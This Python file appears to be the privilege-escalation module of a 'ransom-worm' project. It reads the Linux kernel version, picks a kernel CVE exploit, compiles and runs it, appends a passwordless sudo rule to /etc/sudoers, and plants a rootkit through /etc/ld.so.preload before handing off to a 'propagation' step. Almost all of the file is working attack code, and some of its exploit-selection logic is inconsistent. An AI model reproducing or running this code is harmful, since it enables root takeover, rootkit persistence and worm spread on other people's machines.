###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import re
import os
import subprocess
from packaging import version
from pathlib import Path

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################


# execute bash commands
def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)


# check if kernel version is between a range
def is_vulnerable(version_str, min_version, max_version):
    try:
        # Convert string representations of versions to Version objects
        ver = version.parse(version_str)
        min_ver = version.parse(min_version)
        max_ver = version.parse(max_version)

        # Check if the version is within the range
        return min_ver < ver < max_ver
    except Exception as e:
        print(f"Error in parsing version: {e}")
        return False


# search if worm has exploit for detected version
def search_exploit(kernel_version):
    # check for CVE-2019-13272 - PTRACE_TRACEME
    if is_vulnerable(kernel_version, "4.10", "5.1.17"):
        return "CVE-2019-13272"
    elif is_vulnerable(kernel_version, "2.6.19", "5.9"):
        return "CVE-2021-22555"
    else:
        # TODO
        # check for other CVEs
        return None


# find victim kernel version
def detect_kernel_version():
    kernel_version = exec_bash("cat /proc/version")
    # Extract the version number using regular expression
    match = re.search(
        r"version (\d+\.\d+\.\d+\.\d+|\d+\.\d+\.\d+)", kernel_version.decode()
    )
    if match:
        detected_version = match.group(1)
    else:
        detected_version = None
        print("Couldn't identify kernel version :(")
    return detected_version


# run commands inside an opened shell
def run_command(process, command):
    process.stdin.write(command.encode())
    process.stdin.flush()  # Ensure the command is sent


# run selected exploit
def run_exploit(exploit):
    print(f"exploit: {exploit}")
    is_root = False

    # path of the current file
    file_path = Path(__file__).resolve()
    # Directory of the current file
    dir_path = file_path.parent

    exploits = f"{dir_path}/../utils/privesc"

    # create shell
    process = subprocess.Popen(
        ["bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    if exploit == "CVE-2019-13272":
        try:
            run_command(process, f"gcc -s {exploits}/cve-2019-13272.c -o exploit \n")
            run_command(process, "./exploit \n")
            run_command(
                process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
            )
            run_command(process, "touch /etc/ld.so.preload \n")
            run_command(
                process,
                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
            )
            run_command(process, 'echo "exit" \n')

            # read output
            output = process.stdout.readline()
            while str(output.strip()) != "b'exit'":
                print(output.strip())
                output = process.stdout.readline()

            # close process
            process.stdin.close()
            process.terminate()
            process.wait(timeout=1)
            is_root = True
        except RuntimeError:
            print("An error occured during exploitation...")
    elif exploit == "CVE-2022-0847":
        try:
            run_command(process, f"gcc {exploits}/cve-2022-0847.c -o exploit \n")
            run_command(process, "./exploit /usr/bin/sudo \n")
            run_command(
                process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
            )
            run_command(process, "touch /etc/ld.so.preload \n")
            run_command(
                process,
                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
            )
            run_command(process, 'echo "exit" \n')

            # read output
            output = process.stdout.readline()
            while str(output.strip()) != "b'exit'":
                print(output.strip())
                output = process.stdout.readline()

            # close process
            process.stdin.close()
            process.terminate()
            process.wait(timeout=1)
            is_root = True
        except RuntimeError:
            print("An error occured during exploitation...")
    else:
        is_root = False

    return is_root


def exploit_kernel():
    # get kernel version
    kernel_version = detect_kernel_version()
    print(f"kernel_version: {kernel_version}")

    # check if version has exploit
    exploit_to_run = search_exploit(kernel_version)
    print(f"exploit_to_run: {exploit_to_run}")

    if exploit_to_run:
        is_root = run_exploit(exploit_to_run)
        print(f"is_root: {is_root}")
        if is_root:
            return True
    else:
        # continue checks...
        return False


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################


def run():
    next_action = ""
    data = "data"

    print("privesc module activated...")

    # check if not already root
    if os.geteuid() == 0:
        # user is root
        pass
    else:
        # user is not root
        # start checking:
        # - kernel version
        if exploit_kernel():
            print("kernel exploited")
            next_action = "propagation"
        else:
            print("no kernel exploit available")
            # test something else
    return data, next_action
